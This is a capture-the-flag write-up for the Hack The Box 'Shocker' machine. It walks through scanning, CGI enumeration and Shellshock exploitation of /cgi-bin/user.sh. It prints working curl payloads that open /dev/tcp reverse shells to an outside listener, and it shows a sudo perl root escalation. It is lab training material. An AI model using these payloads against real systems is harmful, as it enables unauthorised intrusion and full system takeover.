# Shocker HTB(https://app.hackthebox.com/machines/108)

![shocker-01]()


Lets add the target to our `/etc/hosts` file:

![hosts-02]()


Now we can use `nmap` to scan the target:

```bash
nmap -sC -sV -A -p- shocker.htb -oN nmap.result
```

![nmap-res-03]()

We have the following:

+ An Apache V2.4.18 Server on port 80.
+ An SSH server on port 2222.


Lets take a look at the web server and see what we can find. 


## Apache port 80

Lets open our browser and navigate towards `http://shocker.htb`

![site-04]()

Not much to see or do here, lets try directory busting:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/common.txti:FUZZ  -u http://shocker.htb/FUZZ
```

![ffuf-05]()


We can see we have a few interesting results. Primarly, the scan confirmed that CGI is enabled on the 
target. We could potentially exploit this. 

Certain versions of Bash incorrectly execute commands that follow function definitions stored inside environment variables - this can be exploited by an attacker in systems that store user input in environment variables.

On such scenario is with cgi scripts. Sometimes cgi scripts store data received from HTTP headers inside 
enviorenment varaibles in order to generate dynamic content. Since we can control the data passed in the 
HTTP headers, we can leverage this to gain RCE.

To pull this off, we need to find a valid cgi script we can execute via the browser. From the `ffuf` scan
we can see that we dont have permissions to view the contents of the `cgi-bin` directory, so we have to 
enumerate some more. 

I use `ffuf` again, this time adding the `-e` switch to scan for possible file extensions:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.
txt -u http://shocker.htb/cgi-bin/FUZZ -e .cgi,.php,.sh,.py,.pl
```

![script-06]()


We got something. Lets check if its vulnerable:

```bash
curl http://shocker.htb/cgi-bin/user.sh -i -H "User-agent: () { :;}; echo; echo pwned"
```

![vuln-07]()

It is. Now we can use a one liner reverse shell to get access to the system. 

First set up the listener: 

```
rlwrap nc -lnvp 443
```

Exploit with:

```
curl http://shocker.htb/cgi-bin/user.sh -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.117/443 0>&1"
```

![shell-08]()


## Privilege Escalation

Lets look for easy wins, like our `sudo` permissions:

```bash
sudo -l
```

![sudo-09]()


WE can see we are allowed to run Perl. If we can run a scripting language as root, escalation is fairly trivial:

```perl
sudo perl -e 'exec "/bin/sh";'
```

![root-10]()


From here we can setup another `nc` listener and upgrade this shell with:

```bash
bash -i >& /dev/tcp/<kali-ip>/9001 0>&1
```

![full-root-11]()

